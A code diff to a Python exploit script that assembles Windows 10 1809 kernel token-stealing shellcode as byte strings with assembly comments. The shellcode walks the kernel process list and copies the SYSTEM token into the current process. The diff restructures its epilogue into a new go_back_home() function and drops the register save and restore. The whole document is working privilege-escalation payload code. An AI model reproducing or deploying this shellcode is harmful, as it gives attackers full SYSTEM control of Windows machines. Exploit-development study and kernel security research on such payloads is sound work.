@@ -113,8 +113,15 @@ def popa():
     
     return code
 
+def go_back_home():
+    code = ''
+    code += "\x48\x31\xc0" # xor rax, rax
+    code += "\xc3"         # ret
+
+    return code
+
+
 tokenStealingShellcodeForWin10_1809 = ""
-tokenStealingShellcodeForWin10_1809 += pusha()
 tokenStealingShellcodeForWin10_1809 += "\x65\x48\x8b\x04\x25\x88\x01\x00\x00"    # mov rax, QWORD PTR gs:0x188
 tokenStealingShellcodeForWin10_1809 += "\x48\x8b\x80\xb8\x00\x00\x00"            # mov rax, QWORD PTR [rax+0xb8]
 tokenStealingShellcodeForWin10_1809 += "\x48\x89\xc3"                            # mov rbx, rax
@@ -127,9 +134,7 @@ tokenStealingShellcodeForWin10_1809 += "\x75\xe5"                               
 tokenStealingShellcodeForWin10_1809 += "\x48\x8b\x8b\x58\x03\x00\x00"            # mov rcx, QWORD PTR [rbx+0x358]
 tokenStealingShellcodeForWin10_1809 += "\x80\xe1\xf0"                            # and cl, 0xf0
 tokenStealingShellcodeForWin10_1809 += "\x48\x89\x88\x58\x03\x00\x00"            # mov QWORD PTR [rax+0x358], rcx
-tokenStealingShellcodeForWin10_1809 += popa()
-tokenStealingShellcodeForWin10_1809 += "\x48\x31\xc0"                            # xor rax, rax
-tokenStealingShellcodeForWin10_1809 += "\xc3"                                    # ret
+
 
 # SYSTEM_INFO structure
 # https://markboy95.blogspot.com/2012/08/pythonctypes-in-win32_13.html
